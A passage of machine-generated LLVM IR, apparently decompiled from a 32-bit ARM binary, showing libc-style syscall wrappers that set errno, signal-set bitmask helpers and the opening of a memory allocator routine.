dec_label_pc_11470:                               ; preds = %dec_label_pc_1144c
  %v0_11470 = call i32 @function_11204()
  %v0_11474 = load i32, i32* %r4.global-to-local, align 4
  %v1_11474 = sub i32 0, %v0_11474
  %v2_11478 = inttoptr i32 %v0_11470 to i32*
  store i32 %v1_11474, i32* %v2_11478, align 4
  br label %dec_label_pc_11480

dec_label_pc_11480:                               ; preds = %dec_label_pc_1144c, %dec_label_pc_11470
  %v1_11488 = phi i32 [ %arg1, %dec_label_pc_1144c ], [ -1, %dec_label_pc_11470 ]
  ret i32 %v1_11488

; uselistorder directives
  uselistorder i32 %arg1, { 2, 0, 1 }
  uselistorder label %dec_label_pc_11480, { 1, 0 }
}

define i32 @function_11490(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_11490:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_11490 = load i32, i32* @r7, align 4
  store i32 %v3_11490, i32* %stack_var_-8, align 4
  %v0_1149c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_1149c, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_1149c, -4095
  br i1 %tmp, label %dec_label_pc_114bc, label %dec_label_pc_114ac

dec_label_pc_114ac:                               ; preds = %dec_label_pc_11490
  %v0_114ac = call i32 @function_11204()
  %v0_114b0 = load i32, i32* %r7.global-to-local, align 4
  %v1_114b0 = sub i32 0, %v0_114b0
  %v2_114b4 = inttoptr i32 %v0_114ac to i32*
  store i32 %v1_114b0, i32* %v2_114b4, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_114bc.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_114bc

dec_label_pc_114bc:                               ; preds = %dec_label_pc_11490, %dec_label_pc_114ac
  %v1_114c0 = phi i32 [ %v0_1149c, %dec_label_pc_11490 ], [ -1, %dec_label_pc_114ac ]
  %v2_114bc = phi i32 [ %v3_11490, %dec_label_pc_11490 ], [ %v2_114bc.pre, %dec_label_pc_114ac ]
  store i32 %v2_114bc, i32* @r7, align 4
  ret i32 %v1_114c0

; uselistorder directives
  uselistorder i32 %v0_1149c, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_114bc, { 1, 0 }
}

define i32 @function_114c4(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_114c4:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_114c4 = load i32, i32* @r7, align 4
  store i32 %v3_114c4, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_114ec, label %dec_label_pc_114dc

dec_label_pc_114dc:                               ; preds = %dec_label_pc_114c4
  %v0_114dc = call i32 @function_11204()
  %v0_114e0 = load i32, i32* %r7.global-to-local, align 4
  %v1_114e0 = sub i32 0, %v0_114e0
  %v2_114e4 = inttoptr i32 %v0_114dc to i32*
  store i32 %v1_114e0, i32* %v2_114e4, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_114f0.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_114ec

dec_label_pc_114ec:                               ; preds = %dec_label_pc_114c4, %dec_label_pc_114dc
  %v2_114f0 = phi i32 [ %v3_114c4, %dec_label_pc_114c4 ], [ %v2_114f0.pre, %dec_label_pc_114dc ]
  %v0_114ec = phi i32 [ %arg1, %dec_label_pc_114c4 ], [ -1, %dec_label_pc_114dc ]
  store i32 %v2_114f0, i32* @r7, align 4
  ret i32 %v0_114ec

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_114ec, { 1, 0 }
}

define i32 @function_114fc(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_114fc:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_114fc = load i32, i32* @r4, align 4
  store i32 %v3_114fc, i32* %stack_var_-16, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_1152c, label %dec_label_pc_1151c

dec_label_pc_1151c:                               ; preds = %dec_label_pc_114fc
  %v0_1151c = call i32 @function_11204()
  %v0_11520 = load i32, i32* %r4.global-to-local, align 4
  %v1_11520 = sub i32 0, %v0_11520
  %v2_11524 = inttoptr i32 %v0_1151c to i32*
  store i32 %v1_11520, i32* %v2_11524, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_11530.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_1152c

dec_label_pc_1152c:                               ; preds = %dec_label_pc_114fc, %dec_label_pc_1151c
  %v2_11530 = phi i32 [ %v3_114fc, %dec_label_pc_114fc ], [ %v2_11530.pre, %dec_label_pc_1151c ]
  %v0_1152c = phi i32 [ %arg1, %dec_label_pc_114fc ], [ -1, %dec_label_pc_1151c ]
  store i32 %v2_11530, i32* @r4, align 4
  ret i32 %v0_1152c

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1152c, { 1, 0 }
}

define i32 @function_11538(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_11538:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_11538 = load i32, i32* @r7, align 4
  store i32 %v3_11538, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_11560, label %dec_label_pc_11550

dec_label_pc_11550:                               ; preds = %dec_label_pc_11538
  %v0_11550 = call i32 @function_11204()
  %v0_11554 = load i32, i32* %r7.global-to-local, align 4
  %v1_11554 = sub i32 0, %v0_11554
  store i32 %v1_11554, i32* @r3, align 4
  %v2_11558 = inttoptr i32 %v0_11550 to i32*
  store i32 %v1_11554, i32* %v2_11558, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_11564.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_11560

dec_label_pc_11560:                               ; preds = %dec_label_pc_11538, %dec_label_pc_11550
  %v2_11564 = phi i32 [ %v3_11538, %dec_label_pc_11538 ], [ %v2_11564.pre, %dec_label_pc_11550 ]
  %v0_11560 = phi i32 [ %arg1, %dec_label_pc_11538 ], [ -1, %dec_label_pc_11550 ]
  store i32 %v2_11564, i32* @r7, align 4
  ret i32 %v0_11560

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_11560, { 1, 0 }
}

define i32 @function_11570(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_11570:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_11570 = load i32, i32* @r4, align 4
  store i32 %v3_11570, i32* %stack_var_-16, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_115a0, label %dec_label_pc_11590

dec_label_pc_11590:                               ; preds = %dec_label_pc_11570
  %v0_11590 = call i32 @function_11204()
  %v0_11594 = load i32, i32* %r4.global-to-local, align 4
  %v1_11594 = sub i32 0, %v0_11594
  %v2_11598 = inttoptr i32 %v0_11590 to i32*
  store i32 %v1_11594, i32* %v2_11598, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_115a4.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_115a0

dec_label_pc_115a0:                               ; preds = %dec_label_pc_11570, %dec_label_pc_11590
  %v2_115a4 = phi i32 [ %v3_11570, %dec_label_pc_11570 ], [ %v2_115a4.pre, %dec_label_pc_11590 ]
  %v0_115a0 = phi i32 [ %arg1, %dec_label_pc_11570 ], [ -1, %dec_label_pc_11590 ]
  store i32 %v2_115a4, i32* @r4, align 4
  ret i32 %v0_115a0

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_115a0, { 1, 0 }
}

define i32 @function_115b0(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_115b0:
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_115e4, label %dec_label_pc_115d4

dec_label_pc_115d4:                               ; preds = %dec_label_pc_115b0
  %v0_115d4 = call i32 @function_11204()
  %v0_115d8 = load i32, i32* %r4.global-to-local, align 4
  %v1_115d8 = sub i32 0, %v0_115d8
  store i32 %v1_115d8, i32* @r3, align 4
  %v2_115dc = inttoptr i32 %v0_115d4 to i32*
  store i32 %v1_115d8, i32* %v2_115dc, align 4
  br label %dec_label_pc_115e4

dec_label_pc_115e4:                               ; preds = %dec_label_pc_115b0, %dec_label_pc_115d4
  %v1_115ec = phi i32 [ %arg1, %dec_label_pc_115b0 ], [ -1, %dec_label_pc_115d4 ]
  ret i32 %v1_115ec

; uselistorder directives
  uselistorder i32 %arg1, { 2, 0, 1 }
  uselistorder label %dec_label_pc_115e4, { 1, 0 }
}

define i32 @function_115f4(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_115f4:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_115f4 = load i32, i32* @r7, align 4
  store i32 %v3_115f4, i32* %stack_var_-8, align 4
  %v0_11600 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_11600, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_11600, -4095
  br i1 %tmp, label %dec_label_pc_11620, label %dec_label_pc_11610

dec_label_pc_11610:                               ; preds = %dec_label_pc_115f4
  %v0_11610 = call i32 @function_11204()
  %v0_11614 = load i32, i32* %r7.global-to-local, align 4
  %v1_11614 = sub i32 0, %v0_11614
  store i32 %v1_11614, i32* @r3, align 4
  %v2_11618 = inttoptr i32 %v0_11610 to i32*
  store i32 %v1_11614, i32* %v2_11618, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_11620.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_11620

dec_label_pc_11620:                               ; preds = %dec_label_pc_115f4, %dec_label_pc_11610
  %v1_11624 = phi i32 [ %v0_11600, %dec_label_pc_115f4 ], [ -1, %dec_label_pc_11610 ]
  %v2_11620 = phi i32 [ %v3_115f4, %dec_label_pc_115f4 ], [ %v2_11620.pre, %dec_label_pc_11610 ]
  store i32 %v2_11620, i32* @r7, align 4
  ret i32 %v1_11624

; uselistorder directives
  uselistorder i32 %v0_11600, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_11620, { 1, 0 }
}

define i32 @function_1162c(i32 %arg1) local_unnamed_addr {
dec_label_pc_1162c:
  store i32 %arg1, i32* @r0, align 4
  %v3_1162c = load i32, i32* @r4, align 4
  %v0_11634 = call i32 @function_10a48()
  %v2_1163c = call i32 @function_10ba8(i32 %v0_11634, i32 %arg1)
  store i32 %v3_1162c, i32* @r4, align 4
  ret i32 %v2_1163c

; uselistorder directives
  uselistorder i32 (i32, i32)* @function_10ba8, { 0, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder i32 ()* @function_10a48, { 0, 3, 2, 1 }
}

define i32 @function_11648(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_11648:
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r1, align 4
  %tmp4 = icmp slt i32 %arg1, 1
  br i1 %tmp4, label %dec_label_pc_11660, label %dec_label_pc_11658

dec_label_pc_11658:                               ; preds = %dec_label_pc_11648
  %v7_1165c = icmp slt i32 %arg1, 65
  br i1 %v7_1165c, label %dec_label_pc_11674, label %dec_label_pc_11660

dec_label_pc_11660:                               ; preds = %dec_label_pc_11658, %dec_label_pc_11648
  %v0_11660 = call i32 @function_11204()
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_1166c = inttoptr i32 %v0_11660 to i32*
  store i32 22, i32* %v2_1166c, align 4
  %v0_1167c.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1167c

dec_label_pc_11674:                               ; preds = %dec_label_pc_11658
  %v0_11674 = call i32 @function_1177c()
  store i32 %v0_11674, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1167c

dec_label_pc_1167c:                               ; preds = %dec_label_pc_11660, %dec_label_pc_11674
  %v0_1167c = phi i32 [ %v0_1167c.pre, %dec_label_pc_11660 ], [ %v0_11674, %dec_label_pc_11674 ]
  ret i32 %v0_1167c

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1167c, { 1, 0 }
}

define i32 @function_1168c(i32* %arg1) local_unnamed_addr {
dec_label_pc_1168c:
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v2_11694 = add i32 %tmp, 4
  %v3_11694 = inttoptr i32 %v2_11694 to i32*
  store i32 0, i32* %v3_11694, align 4
  %v1_11698 = load i32, i32* %r3.global-to-local, align 4
  %v2_11698 = inttoptr i32 %v1_11698 to i32*
  store i32 0, i32* %v2_11698, align 4
  ret i32 0
}

define i32 @function_116a0(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_116a0:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_116a0 = load i32, i32* @r4, align 4
  store i32 %v3_116a0, i32* %stack_var_-16, align 4
  %v6_116a0 = load i32, i32* @r5, align 4
  %v9_116a0 = load i32, i32* @r6, align 4
  %v7_116a8 = icmp eq i32 %arg2, -1
  br i1 %v7_116a8, label %.thread4, label %bb

.thread4:                                         ; preds = %dec_label_pc_116a0
  br label %.thread16

bb:                                               ; preds = %dec_label_pc_116a0
  %v2_116b0 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %arg1, i32* @r5, align 4
  %tmp28 = icmp slt i32 %arg1, 1
  br i1 %tmp28, label %.thread16, label %dec_label_pc_116cc

.thread16:                                        ; preds = %bb, %.thread4
  store i32 1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_116d4

dec_label_pc_116cc:                               ; preds = %bb
  store i32 0, i32* %r2.global-to-local, align 4
  %v7_116d0 = icmp slt i32 %arg1, 65
  br i1 %v7_116d0, label %dec_label_pc_116e8, label %dec_label_pc_116d4

dec_label_pc_116d4:                               ; preds = %.thread16, %dec_label_pc_116cc
  %v0_116d4 = call i32 @function_11204()
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_116e0 = inttoptr i32 %v0_116d4 to i32*
  store i32 22, i32* %v2_116e0, align 4
  %v0_11740.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb33

dec_label_pc_116e8:                               ; preds = %dec_label_pc_116cc
  %v2_116e8 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_116e8, i32* @r4, align 4
  store i32 %arg1, i32* @r1, align 4
  %v2_116f0 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_116f0, i32* @r0, align 4
  store i32 %arg2, i32* %stack_var_-36, align 4
  store i32 0, i32* %stack_var_-24, align 4
  %v0_11700 = call i32 @function_1177c()
  %v0_11708 = load i32, i32* @r5, align 4
  %v2_11710 = call i32 @function_11758(i32 ptrtoint (i32* @global_var_20b98.370 to i32), i32 %v0_11708)
  store i32 %v2_116b0, i32* %r2.global-to-local, align 4
  %v0_11728 = load i32, i32* @r5, align 4
  %v3_11730 = call i32 @function_13b8c(i32 %v0_11728, i32 %v2_116e8, i32 %v2_116b0)
  %v1_11734 = icmp slt i32 %v3_11730, 0
  br i1 %v1_11734, label %bb32, label %bb31

bb31:                                             ; preds = %dec_label_pc_116e8
  %v5_11738 = load i32, i32* %stack_var_-56, align 4
  store i32 %v5_11738, i32* %r2.global-to-local, align 4
  br label %bb33

bb32:                                             ; preds = %dec_label_pc_116e8
  store i32 -1, i32* %r2.global-to-local, align 4
  br label %bb33

bb33:                                             ; preds = %bb31, %dec_label_pc_116d4, %bb32
  %v0_11740 = phi i32 [ %v5_11738, %bb31 ], [ %v0_11740.pre, %dec_label_pc_116d4 ], [ -1, %bb32 ]
  %v2_11748 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_11748, i32* @r4, align 4
  store i32 %v6_116a0, i32* @r5, align 4
  store i32 %v9_116a0, i32* @r6, align 4
  ret i32 %v0_11740

; uselistorder directives
  uselistorder i32* %r2.global-to-local, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 ()* @function_1177c, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder i32 %arg1, { 2, 3, 0, 1 }
  uselistorder label %bb33, { 2, 0, 1 }
  uselistorder label %dec_label_pc_116d4, { 1, 0 }
}

define i32 @function_11758(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_11758:
  %v1_11758 = add i32 %arg2, -1
  %v3_1175c = udiv i32 %v1_11758, 32
  %v4_11760 = mul nuw nsw i32 %v3_1175c, 4
  %v5_11760 = add i32 %v4_11760, %arg1
  %v6_11760 = inttoptr i32 %v5_11760 to i32*
  %v7_11760 = load i32, i32* %v6_11760, align 4
  %v1_11764 = urem i32 %v1_11758, 32
  %v7_1176c = shl i32 1, %v1_11764
  %v8_1176c = and i32 %v7_11760, %v7_1176c
  %v10_1176c = icmp ne i32 %v8_1176c, 0
  %. = zext i1 %v10_1176c to i32
  ret i32 %.

; uselistorder directives
  uselistorder i32 %v1_11758, { 1, 0 }
}

define i32 @function_1177c() local_unnamed_addr {
dec_label_pc_1177c:
  %v0_1177c = load i32, i32* @r1, align 4
  %v1_1177c = add i32 %v0_1177c, -1
  %v3_11780 = udiv i32 %v1_1177c, 32
  %v0_11784 = load i32, i32* @r0, align 4
  %v4_11784 = mul nuw nsw i32 %v3_11780, 4
  %v5_11784 = add i32 %v0_11784, %v4_11784
  %v6_11784 = inttoptr i32 %v5_11784 to i32*
  %v7_11784 = load i32, i32* %v6_11784, align 4
  %v1_11788 = urem i32 %v1_1177c, 32
  %v7_11790 = shl i32 1, %v1_11788
  %v8_11790 = or i32 %v7_11784, %v7_11790
  store i32 %v8_11790, i32* %v6_11784, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_1177c, { 1, 0 }
}

define i32 @function_117a0(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_117a0:
  %v1_117a0 = add i32 %arg2, -1
  %v3_117a4 = udiv i32 %v1_117a0, 32
  %v4_117a8 = mul nuw nsw i32 %v3_117a4, 4
  %v5_117a8 = add i32 %v4_117a8, %arg1
  %v6_117a8 = inttoptr i32 %v5_117a8 to i32*
  %v7_117a8 = load i32, i32* %v6_117a8, align 4
  %v1_117ac = urem i32 %v1_117a0, 32
  %tmp = shl i32 -1, %v1_117ac
  %v8_117b4 = add i32 %tmp, -1
  %v9_117b4 = and i32 %v7_117a8, %v8_117b4
  store i32 %v9_117b4, i32* %v6_117a8, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_117a0, { 1, 0 }
}

define i32 @function_117c4(i32 %arg1) local_unnamed_addr {
dec_label_pc_117c4:
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %v3_117c4 = udiv i32 %arg1, 256
  store i32 %v3_117c4, i32* %r1.global-to-local, align 4
  %v2_117c8 = icmp ugt i32 %arg1, 16777215
  store i32 %arg1, i32* %ip.global-to-local, align 4
  br i1 %v2_117c8, label %bb, label %bb1

bb:                                               ; preds = %dec_label_pc_117c4
  br label %bb1

bb1:                                              ; preds = %dec_label_pc_117c4, %bb
  %v0_117d4 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_117c8, i32 %v0_117d4)
  %v0_117d8 = load i32, i32* %r1.global-to-local, align 4
  %v1_117d8 = add i32 %v0_117d8, 1048320
  %v3_117dc = udiv i32 %v1_117d8, 65536
  %v1_117e0 = and i32 %v3_117dc, 8
  %v6_117e4 = shl i32 %v0_117d8, %v1_117e0
  %v1_117e8 = add i32 %v6_117e4, 520192
  %v3_117ec = udiv i32 %v1_117e8, 65536
  %v1_117f0 = and i32 %v3_117ec, 4
  %v6_117f4 = shl i32 %v6_117e4, %v1_117f0
  %v1_117f8 = add i32 %v6_117f4, 245760
  %v3_117fc = udiv i32 %v1_117f8, 65536
  %v1_11800 = and i32 %v3_117fc, 2
  %v6_11804 = shl i32 %v6_117f4, %v1_11800
  store i32 %v6_11804, i32* %r1.global-to-local, align 4
  %v1_11808 = sub nsw i32 13, %v1_117e0
  %v2_1180c = sub nsw i32 %v1_11808, %v1_117f0
  %v3_11810 = udiv i32 %v6_11804, 32768
  %v4_11810 = sub nuw nsw i32 -1, %v3_11810
  %v4_11814 = udiv i32 %v6_11804, 16384
  %v5_11814 = and i32 %v4_11814, %v4_11810
  %v2_11818 = sub nsw i32 %v2_1180c, %v1_11800
  %v2_1181c = add nsw i32 %v2_11818, %v5_11814
  %v1_11820 = add nsw i32 %v2_1181c, 6
  %v0_11824 = load i32, i32* %ip.global-to-local, align 4
  %v6_11824 = lshr i32 %v0_11824, %v1_11820
  %v3_11828 = mul nsw i32 %v2_1181c, 4
  %v1_1182c = add nsw i32 %v3_11828, 32
  %v1_11830 = urem i32 %v6_11824, 4
  %v2_11834 = or i32 %v1_11830, %v1_1182c
  ret i32 %v2_11834

; uselistorder directives
  uselistorder i32 %arg1, { 1, 2, 0 }
  uselistorder label %bb1, { 1, 0 }
}

define i32 @function_1183c() local_unnamed_addr {
dec_label_pc_1183c:
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %v3_1183c = load i32, i32* @r4, align 4
  %v6_1183c = load i32, i32* @r5, align 4
  %v9_1183c = load i32, i32* @r6, align 4
  %v12_1183c = load i32, i32* @r7, align 4
  %v15_1183c = load i32, i32* @r8, align 4
  %v18_1183c = load i32, i32* @sb, align 4
  %v21_1183c = load i32, i32* @sl, align 4
  %v24_1183c = load i32, i32* @fp, align 4
  %v27_1183c = load i32, i32* @lr, align 4
  store i32 68, i32* %r3.global-to-local, align 4
  store i32 124820, i32* %r1.global-to-local, align 4
  %v4_11850 = load i32, i32* inttoptr (i32 124888 to i32*), align 8
  store i32 %v4_11850, i32* %r4.global-to-local, align 4
  store i32 36, i32* %r3.global-to-local, align 4
  %v4_1185c = load i32, i32* inttoptr (i32 124856 to i32*), align 8
  store i32 %v4_1185c, i32* %r1.global-to-local, align 4
  %v0_11860 = load i32, i32* @r0, align 4
  store i32 %v0_11860, i32* @r5, align 4
  store i32 %v4_11850, i32* %r2.global-to-local, align 4
  %v2_11868 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_11868, i32* %r0.global-to-local, align 4
  store i32 72, i32* %r3.global-to-local, align 4
  store i32 124820, i32* %ip.global-to-local, align 4
  %v4_11874 = load i32, i32* inttoptr (i32 124892 to i32*), align 4
  store i32 %v4_11874, i32* %ip.global-to-local, align 4
  store i32 71808, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_11874)
  %v0_11880 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_11880, i32* %r0.global-to-local, align 4
  store i32 16, i32* %r3.global-to-local, align 4
  store i32 124820, i32* %r1.global-to-local, align 4
  %v4_1188c = load i32, i32* inttoptr (i32 124836 to i32*), align 4
  store i32 %v4_1188c, i32* @ip, align 4
  store i32 ptrtoint (i32* @global_var_11898.376 to i32), i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_1188c)
  %v0_11898 = load i32, i32* @r5, align 4
  %tmp = icmp ult i32 %v0_11898, -32
  br i1 %tmp, label %dec_label_pc_118b4, label %dec_label_pc_118a0

dec_label_pc_118a0:                               ; preds = %dec_label_pc_1183c
  %v0_118a0 = call i32 @function_11204()
  store i32 %v0_118a0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  store i32 12, i32* @r3, align 4
  %v2_118ac = inttoptr i32 %v0_118a0 to i32*
  store i32 12, i32* %v2_118ac, align 4
  br label %dec_label_pc_12130

dec_label_pc_118b4:                               ; preds = %dec_label_pc_1183c
  %v1_118b4 = add i32 %v0_11898, 11
  store i32 %v1_118b4, i32* %r0.global-to-local, align 4
  store i32 32, i32* %r3.global-to-local, align 4
  store i32 124820, i32* %r2.global-to-local, align 4
  %v2_118c0 = icmp ugt i32 %v1_118b4, 14
  %v7_118c0 = icmp eq i32 %v1_118b4, 15
  %v2_118c4 = xor i1 %v7_118c0, true
  %v3_118c4 = and i1 %v2_118c0, %v2_118c4
  br i1 %v3_118c4, label %bb, label %bb138

bb:                                               ; preds = %dec_label_pc_118b4
  %v5_118c4 = and i32 %v1_118b4, -8
  store i32 %v5_118c4, i32* @sl, align 4
  br label %bb138

bb138:                                            ; preds = %dec_label_pc_118b4, %bb
  %v4_118c8 = load i32, i32* inttoptr (i32 124852 to i32*), align 4
  store i32 %v4_118c8, i32* @r0, align 4
  %v1_118cc = inttoptr i32 %v4_118c8 to i32*
  %v2_118cc = load i32, i32* %v1_118cc, align 4
  store i32 %v2_118cc, i32* @r4, align 4
  %v2_118d0 = xor i1 %v2_118c0, true
  %v3_118d0 = or i1 %v7_118c0, %v2_118d0
  br i1 %v3_118d0, label %bb139, label %bb140

bb139:                                            ; preds = %bb138
  store i32 16, i32* @sl, align 4
  br label %bb140

bb140:                                            ; preds = %bb138, %bb139
  %v1_118d4 = urem i32 %v2_118cc, 2
  %v2_118d4 = icmp eq i32 %v1_118d4, 0
  br i1 %v2_118d4, label %dec_label_pc_118dc, label %dec_label_pc_118ec

dec_label_pc_118dc:                               ; preds = %bb140
  %v2_118dc = icmp eq i32 %v2_118cc, 0
  br i1 %v2_118dc, label %dec_label_pc_118e4, label %dec_label_pc_11cc8

dec_label_pc_118e4:                               ; preds = %dec_label_pc_118dc
  %v0_118e4 = call i32 @function_126f4()
  store i32 %v0_118e4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_11cc8

dec_label_pc_118ec:                               ; preds = %bb140
  %v0_118ec = load i32, i32* @sl, align 4
  %tmp201 = icmp ugt i32 %v0_118ec, %v2_118cc
  br i1 %tmp201, label %dec_label_pc_11914, label %dec_label_pc_118f4

dec_label_pc_118f4:                               ; preds = %dec_label_pc_118ec
  %v1_118f4 = add i32 %v4_118c8, -4
  store i32 %v1_118f4, i32* %r1.global-to-local, align 4
  %v3_118f8 = udiv i32 %v0_118ec, 8
  store i32 %v3_118f8, i32* %r2.global-to-local, align 4
  %v4_118fc = mul nuw i32 %v3_118f8, 4
  %v5_118fc = add i32 %v4_118fc, %v1_118f4
  %v6_118fc = inttoptr i32 %v5_118fc to i32*
  %v7_118fc = load i32, i32* %v6_118fc, align 4
  store i32 %v7_118fc, i32* %r0.global-to-local, align 4
  %v2_11900 = icmp eq i32 %v7_118fc, 0
  br i1 %v2_11900, label %dec_label_pc_11914, label %.thread1

.thread1:                                         ; preds = %dec_label_pc_118f4
  %v2_11904 = add i32 %v7_118fc, 8
  %v3_11904 = inttoptr i32 %v2_11904 to i32*
  %v4_11904 = load i32, i32* %v3_11904, align 4
  store i32 %v4_11904, i32* %r3.global-to-local, align 4
  store i32 %v2_11904, i32* %r0.global-to-local, align 4
  store i32 %v2_11904, i32* %r4.global-to-local, align 4
  store i32 %v4_11904, i32* %v6_118fc, align 4
  br label %dec_label_pc_12114

dec_label_pc_11914:                               ; preds = %dec_label_pc_118f4, %dec_label_pc_118ec
  %tmp202 = icmp ugt i32 %v0_118ec, 255
  br i1 %tmp202, label %dec_label_pc_11964, label %dec_label_pc_1191c

dec_label_pc_1191c:                               ; preds = %dec_label_pc_11914
  store i32 124820, i32* %ip.global-to-local, align 4
  store i32 32, i32* %r3.global-to-local, align 4
  %v4_11924 = load i32, i32* inttoptr (i32 124852 to i32*), align 4
  %v3_11928 = udiv i32 %v0_118ec, 8
  store i32 %v3_11928, i32* @r7, align 4
  %v4_1192c = mul nuw i32 %v3_11928, 8
  %v5_1192c = add i32 %v4_11924, %v4_1192c
  store i32 %v5_1192c, i32* %r3.global-to-local, align 4
  %v1_11930 = add i32 %v5_1192c, 44
  store i32 %v1_11930, i32* %ip.global-to-local, align 4
  %v1_11934 = add i32 %v5_1192c, 56
  %v2_11934 = inttoptr i32 %v1_11934 to i32*
  %v3_11934 = load i32, i32* %v2_11934, align 4
  store i32 %v3_11934, i32* %r0.global-to-local, align 4
  %v9_11938 = icmp eq i32 %v3_11934, %v1_11930
